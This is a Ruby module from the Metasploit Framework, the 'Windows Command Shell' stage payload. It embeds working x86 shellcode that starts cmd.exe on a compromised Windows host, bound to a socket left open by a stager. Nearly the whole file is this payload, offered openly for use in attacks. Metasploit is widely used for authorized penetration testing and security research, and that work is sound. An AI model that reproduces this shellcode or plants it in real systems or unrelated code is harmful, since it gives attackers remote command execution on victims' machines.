require 'msf/core'

module Msf
module Payloads
module Stages
module Windows

module Shell

	include Msf::Payload::Windows

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Command Shell',
			'Version'       => '$Revision$',
			'Description'   => 'Spawn a command shell',
			'Author'        => 'vlad902',
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadCompat' =>
				{
					'Convention'   => 'sockedi',
				},
			'Stage'         =>
				{
					'Offsets' =>
						{
							'EXITFUNC' => [ 214, 'V' ]
						},
					'Payload' =>
						"\xfc\x89\xfb\xe8\x48\x00\x00\x00\x60\x8b\x6c\x24\x24\x8b\x45\x3c" +
						"\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b" +
						"\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01" +
						"\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b" +
						"\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc3" +
						"\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08" +
						"\x50\x89\xe6\x66\x6a\x64\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29" +
						"\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42" +
						"\x2c\x93\x8d\x7a\x38\xab\xab\xab\x68\x72\xfe\xb3\x16\x8b\x1e\x8b" +
						"\x76\x04\x53\xff\xd6\x57\x52\x51\x51\x51\x6a\x01\x51\x51\x55\x51" +
						"\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0" +
						"\x68\x8e\x4e\x0e\xec\x53\xff\xd6\x66\x68\x00\x00\x66\x68\x33\x32" +
						"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xe7\x79\xc6\x79\x50\xff\xd6" +
						"\xff\x77\xfc\xff\xd0\x68\x7e\xd8\xe2\x73\x53\xff\xd6\xff\xd0"
				}
			))
	end

end

end end end end
